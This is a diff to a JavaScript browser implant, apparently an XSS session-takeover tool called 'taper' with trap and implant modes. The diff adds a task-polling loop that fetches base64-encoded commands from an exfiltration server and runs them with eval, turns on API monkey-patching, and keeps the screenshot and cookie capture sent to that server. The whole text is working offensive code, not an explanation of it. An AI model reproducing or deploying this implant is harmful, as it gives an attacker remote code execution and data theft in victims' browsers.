@@ -86,8 +86,8 @@ function initGlobals()
 		// load the page the user was on in the iframe
 		// when they reloaded the page. Otherwise,
 		// they'll start here
-		window.taperstartingPage = "http://targetapp.localdemo/wp-admin";
-		//window.taperstartingPage = "https://127.0.0.1:8443/";
+		//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
+		window.taperstartingPage = "https://127.0.0.1:8443/";
 	}
 	else // if implant mode
 	{
@@ -110,7 +110,7 @@ function initGlobals()
 	
 
 	// Should we try to monkey patch underlying API prototypes?
-	window.monkeyPatchAPIs = false;
+	window.monkeyPatchAPIs = true;
 
 
 	// Should we capture a screenshot after a delay after an API call?
@@ -120,6 +120,10 @@ function initGlobals()
 	window.postApiCallScreenshot = true;
 	window.screenshotDelay       = 1000;
 
+
+	// Should we check for tasks? How often?
+	window.taperTaskCheck      = true;
+	window.taperTaskCheckDelay = 5000;
 
 	// Helpful variables
 	if (!sessionStorage.hasOwnProperty('taperLastUrl'))
@@ -182,8 +186,6 @@ function sendScreenshot()
 {
 	if (typeof html2canvas === "function")
 	{
-		console.log("---Snagging screenshot...");
-
 		var myReferences = "";
 
 		if (window.taperMode === "trap")
@@ -203,7 +205,6 @@ function sendScreenshot()
 				// console.log(this.responseText)
 			};
 
-			console.log("About to send image....");
 			// request = new XMLHttpRequest();
 			request = new window.taperXHR();
 			request.noIntercept = true;
@@ -320,7 +321,7 @@ function checkCookies()
 
 			if (cookieName in cookieDict)
 			{
-				// console.log("== Existing cookie: " + cookieName);
+				console.log("== Existing cookie: " + cookieName);
 				if (cookieDict[cookieName] != cookieValue)
 				{
 					// Existing cookie, but the value has changed
@@ -952,6 +953,23 @@ function monkeyPatchFetch()
 
 
 
+async function checkTasks()
+{
+	var taskRequest  = await fetch(taperexfilServer + "/client/taskCheck/" + sessionStorage.getItem('taperSessionUUID'));
+	var jsonResponse = await taskRequest.json();
+
+	for (let i = 0; i < jsonResponse.length; i++)
+	{
+		var taskId   = jsonResponse[i].id;
+		var taskData = jsonResponse[i].data;
+
+		console.log("Got task: " + taskData);
+
+		eval(atob(taskData));
+	}
+}
+
+
 // Start the tap
 function takeOver()
 {
@@ -1024,6 +1042,12 @@ function takeOver()
 
 	// Add timed just to make sure we get called
 	setInterval(runUpdate, 100);
+
+	// And don't forget tasks
+	if (window.taperTaskCheck)
+	{
+		setInterval(checkTasks, window.taperTaskCheckDelay);
+	}
 }
 
 
